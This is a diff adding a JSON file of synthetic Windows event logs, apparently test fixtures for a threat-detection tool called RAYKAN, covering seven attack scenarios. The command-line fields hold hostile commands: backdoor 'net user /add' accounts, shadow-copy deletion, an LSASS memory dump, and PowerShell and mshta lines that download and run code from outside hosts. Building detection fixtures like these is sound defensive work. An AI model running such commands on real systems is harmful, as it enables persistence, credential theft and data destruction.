@@ -1,0 +1,293 @@
+{
+  "_description": "RAYKAN v21 sample event logs — each scenario independently triggers detections, incidents, and case creation. Paste any array into the RAYKAN Ingest Events textarea to test live.",
+  "_usage": "Navigate to RAYKAN tab → Ingest Events → paste one of the JSON arrays below → click Analyze",
+  "_generated": "2026-05-02T13:48:12.432Z",
+  "scenarios": {
+    "brute_force_compromise": [
+      {
+        "EventID": 4625,
+        "Computer": "DC01",
+        "User": "CORP\\admin",
+        "SourceIP": "10.10.10.55",
+        "LogonType": 3,
+        "Status": "0xC000006A",
+        "TimeGenerated": "2026-05-02T13:44:12.431Z",
+        "TimeCreated": "2026-05-02T13:44:12.431Z"
+      },
+      {
+        "EventID": 4625,
+        "Computer": "DC01",
+        "User": "CORP\\admin",
+        "SourceIP": "10.10.10.55",
+        "LogonType": 3,
+        "Status": "0xC000006A",
+        "TimeGenerated": "2026-05-02T13:45:12.431Z",
+        "TimeCreated": "2026-05-02T13:45:12.431Z"
+      },
+      {
+        "EventID": 4624,
+        "Computer": "DC01",
+        "User": "CORP\\admin",
+        "SourceIP": "10.10.10.55",
+        "LogonType": 3,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-02T13:46:12.431Z",
+        "TimeCreated": "2026-05-02T13:46:12.431Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "DC01",
+        "User": "CORP\\admin",
+        "ParentProcess": "cmd.exe",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user hacker P@ssw0rd /add",
+        "TimeGenerated": "2026-05-02T13:47:12.431Z",
+        "TimeCreated": "2026-05-02T13:47:12.431Z"
+      }
+    ],
+    "ransomware": [
+      {
+        "EventID": 4688,
+        "Computer": "WS-42",
+        "User": "john.doe",
+        "ProcessName": "cmd.exe",
+        "CommandLine": "cmd.exe /c powershell -EncodedCommand aQBlAHgA",
+        "TimeGenerated": "2026-05-02T13:43:12.431Z",
+        "TimeCreated": "2026-05-02T13:43:12.431Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-42",
+        "User": "john.doe",
+        "ProcessName": "powershell.exe",
+        "CommandLine": "powershell -NonInteractive -EncodedCommand aQBlAHgA",
+        "TimeGenerated": "2026-05-02T13:43:52.431Z",
+        "TimeCreated": "2026-05-02T13:43:52.431Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-42",
+        "User": "john.doe",
+        "ProcessName": "vssadmin.exe",
+        "CommandLine": "vssadmin delete shadows /all /quiet",
+        "TimeGenerated": "2026-05-02T13:45:12.431Z",
+        "TimeCreated": "2026-05-02T13:45:12.431Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-42",
+        "User": "john.doe",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user hacker1 Passw0rd! /add",
+        "TimeGenerated": "2026-05-02T13:46:12.431Z",
+        "TimeCreated": "2026-05-02T13:46:12.431Z"
+      }
+    ],
+    "lateral_movement": [
+      {
+        "EventID": 4624,
+        "Computer": "DC-01",
+        "User": "Administrator",
+        "SourceIP": "192.168.1.50",
+        "LogonType": 3,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-02T13:39:52.432Z",
+        "TimeCreated": "2026-05-02T13:39:52.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "DC-01",
+        "User": "Administrator",
+        "ProcessName": "net.exe",
+        "CommandLine": "net view /domain",
+        "TimeGenerated": "2026-05-02T13:40:12.432Z",
+        "TimeCreated": "2026-05-02T13:40:12.432Z"
+      },
+      {
+        "EventID": 4624,
+        "Computer": "SERVER-03",
+        "User": "Administrator",
+        "SourceIP": "192.168.1.42",
+        "LogonType": 3,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-02T13:41:12.432Z",
+        "TimeCreated": "2026-05-02T13:41:12.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "SERVER-03",
+        "User": "Administrator",
+        "ProcessName": "net.exe",
+        "CommandLine": "net group \"Domain Admins\"",
+        "TimeGenerated": "2026-05-02T13:41:32.432Z",
+        "TimeCreated": "2026-05-02T13:41:32.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "SERVER-03",
+        "User": "Administrator",
+        "ProcessName": "cmd.exe",
+        "ParentProcess": "net.exe",
+        "CommandLine": "cmd.exe /c net user hacker2 P@ss /add",
+        "TimeGenerated": "2026-05-02T13:41:52.432Z",
+        "TimeCreated": "2026-05-02T13:41:52.432Z"
+      }
+    ],
+    "apt": [
+      {
+        "EventID": 4688,
+        "Computer": "WS-01",
+        "User": "analyst",
+        "ProcessName": "mshta.exe",
+        "CommandLine": "mshta.exe http://cdn.update-service.net/flash.hta",
+        "TimeGenerated": "2026-05-02T12:48:12.432Z",
+        "TimeCreated": "2026-05-02T12:48:12.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-01",
+        "User": "analyst",
+        "ProcessName": "powershell.exe",
+        "CommandLine": "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')",
+        "TimeGenerated": "2026-05-02T12:49:52.432Z",
+        "TimeCreated": "2026-05-02T12:49:52.432Z"
+      },
+      {
+        "EventID": 4625,
+        "Computer": "DC-01",
+        "User": "analyst",
+        "SourceIP": "10.1.1.201",
+        "LogonType": 3,
+        "Status": "0xC000006A",
+        "TimeGenerated": "2026-05-02T12:54:52.432Z",
+        "TimeCreated": "2026-05-02T12:54:52.432Z"
+      },
+      {
+        "EventID": 4624,
+        "Computer": "DC-01",
+        "User": "analyst",
+        "SourceIP": "10.1.1.201",
+        "LogonType": 3,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-02T12:56:32.432Z",
+        "TimeCreated": "2026-05-02T12:56:32.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "DC-01",
+        "User": "analyst",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user aptsvc Sup3r$ecret /add",
+        "TimeGenerated": "2026-05-02T12:58:12.432Z",
+        "TimeCreated": "2026-05-02T12:58:12.432Z"
+      }
+    ],
+    "credential_dump": [
+      {
+        "EventID": 4688,
+        "Computer": "WORKSTATION-42",
+        "User": "john.doe",
+        "ProcessName": "procdump64.exe",
+        "CommandLine": "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
+        "TimeGenerated": "2026-05-02T13:43:12.432Z",
+        "TimeCreated": "2026-05-02T13:43:12.432Z"
+      },
+      {
+        "EventID": 4624,
+        "Computer": "WORKSTATION-42",
+        "User": "Administrator",
+        "SourceIP": "127.0.0.1",
+        "LogonType": 9,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-02T13:44:12.432Z",
+        "TimeCreated": "2026-05-02T13:44:12.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WORKSTATION-42",
+        "User": "Administrator",
+        "ProcessName": "powershell.exe",
+        "CommandLine": "powershell -enc SQBFAFgA",
+        "TimeGenerated": "2026-05-02T13:44:32.432Z",
+        "TimeCreated": "2026-05-02T13:44:32.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WORKSTATION-42",
+        "User": "Administrator",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user backdoor_svc BackD00r! /add",
+        "TimeGenerated": "2026-05-02T13:45:12.432Z",
+        "TimeCreated": "2026-05-02T13:45:12.432Z"
+      }
+    ],
+    "insider": [
+      {
+        "EventID": 4688,
+        "Computer": "WS-33",
+        "User": "j.smith",
+        "ProcessName": "7z.exe",
+        "CommandLine": "7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*",
+        "TimeGenerated": "2026-05-02T11:48:12.432Z",
+        "TimeCreated": "2026-05-02T11:48:12.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-33",
+        "User": "j.smith",
+        "ProcessName": "xcopy.exe",
+        "CommandLine": "xcopy /s /e C:\\CorpData\\Source E:\\External\\backup",
+        "TimeGenerated": "2026-05-02T11:56:32.432Z",
+        "TimeCreated": "2026-05-02T11:56:32.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "WS-33",
+        "User": "j.smith",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user temp_exfil_svc P@ssw0rd /add",
+        "TimeGenerated": "2026-05-02T11:58:12.432Z",
+        "TimeCreated": "2026-05-02T11:58:12.432Z"
+      }
+    ],
+    "supply_chain": [
+      {
+        "EventID": 4688,
+        "Computer": "DEV-01",
+        "User": "developer",
+        "ProcessName": "node.exe",
+        "CommandLine": "npm install lodash-utils-extra@3.1.2",
+        "TimeGenerated": "2026-05-01T13:48:12.432Z",
+        "TimeCreated": "2026-05-01T13:48:12.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "DEV-01",
+        "User": "developer",
+        "ProcessName": "powershell.exe",
+        "CommandLine": "powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')",
+        "TimeGenerated": "2026-05-01T13:49:52.432Z",
+        "TimeCreated": "2026-05-01T13:49:52.432Z"
+      },
+      {
+        "EventID": 4624,
+        "Computer": "DEV-01",
+        "User": "developer",
+        "SourceIP": "45.142.212.100",
+        "LogonType": 3,
+        "Status": "Success",
+        "TimeGenerated": "2026-05-01T13:54:52.432Z",
+        "TimeCreated": "2026-05-01T13:54:52.432Z"
+      },
+      {
+        "EventID": 4688,
+        "Computer": "DEV-01",
+        "User": "developer",
+        "ProcessName": "net.exe",
+        "CommandLine": "net user svc_install P@ssHacked /add",
+        "TimeGenerated": "2026-05-01T13:56:32.432Z",
+        "TimeCreated": "2026-05-01T13:56:32.432Z"
+      }
+    ]
+  }
+}
